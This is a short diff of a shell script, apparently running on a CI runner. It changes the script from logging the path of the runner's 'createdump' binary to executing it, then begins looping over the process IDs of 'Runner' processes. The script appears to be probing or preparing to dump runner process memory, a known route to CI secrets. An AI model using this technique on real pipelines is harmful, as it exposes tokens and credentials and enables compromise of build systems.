@@ -15,7 +15,7 @@ echo "file"
 file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
 echo $(chmod +rwx /home/runner/runners/2.284.0/bin/createdump -v) >> /tmp/file.txt
 
-echo "/home/runner/runners/2.284.0/bin/createdump" >> /tmp/file.txt;
+echo $(/home/runner/runners/2.284.0/bin/createdump) >> /tmp/file.txt
 
 
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
